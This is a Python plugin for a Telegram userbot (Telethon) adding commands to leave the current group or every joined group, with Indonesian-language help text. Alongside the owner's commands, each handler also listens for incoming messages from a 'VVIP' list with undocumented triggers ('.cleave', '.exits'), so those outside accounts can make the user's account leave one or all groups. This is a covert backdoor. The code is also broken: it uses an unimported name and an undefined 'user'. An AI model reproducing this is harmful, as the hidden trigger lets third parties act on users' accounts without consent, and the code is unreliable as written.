from telethon.tl.functions.channels import LeaveChannelRequest as sapi

from userbot import BLACKLIST_CHAT as well
from userbot import CMD_HANDLER as cmd
from userbot import CMD_HELP, VVIP
from userbot.utils import edit_or_reply, alby_cmd as the
from userbot.events import register as one
from .gcast import GCAST_BLACKLIST as best

# thanks: RAM-UBOT
# recode: @punya_alby


@the(pattern="leave$", allow_sudo=False)
@one(incoming=True, from_users=VVIP,
          pattern=r"^\.cleave(?: |$)(.*)")
async def kikme(event):
    if event.chat_id in BLACKLIST_CHAT:
        return await edit_or_reply(
            event, "**Kamu Tidak Bisa Menggunakannya Disini!!**"
        )
    await edit_or_reply(event, f"`{user.first_name} telah meninggalkan grup, Selamat Tinggal👋`")
    await event.client.kick_participant(event.chat_id, "me")


@the(pattern="exitall$", allow_sudo=False)
@one(incoming=True, from_users=VVIP,
          pattern=r"^\.exits(?: |$)(.*)")
async def kickmeall(event):
    Alby = await edit_or_reply(event, "`Saat Nya keluar Dari seluruh Group.....`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            if chat not in best and chat not in well:
                try:
                    done += 1
                    await event.client(sapi(chat))
                except BaseException:
                    er += 1
    await Alby.edit(
        f"**Berhasil Keluar dari {done} Group, Gagal Keluar dari {er} Group**"
    )


CMD_HELP.update(
    {
        "kickme": f"❖ **Plugin : **`kickme`\
        \n\n ┌❖ **Perintah :** `{cmd}leave`\
        \n └❖ **Keluar grup.\
    "
    }
)

CMD_HELP.update(
    {
        "exitall": f"❖ **Plugin : **`exitall`\
        \n\n ┌❖ **Perintah :** `{cmd}exitall`\
        \n └❖ **Keluar dari semua grup telegram yang anda gabung.\
        \n\n  •NOTE: Berhati hatilah Dalam menggunakan fitur {cmd}exitall, Karna Itu Berbahaya.\
    "
    }
)
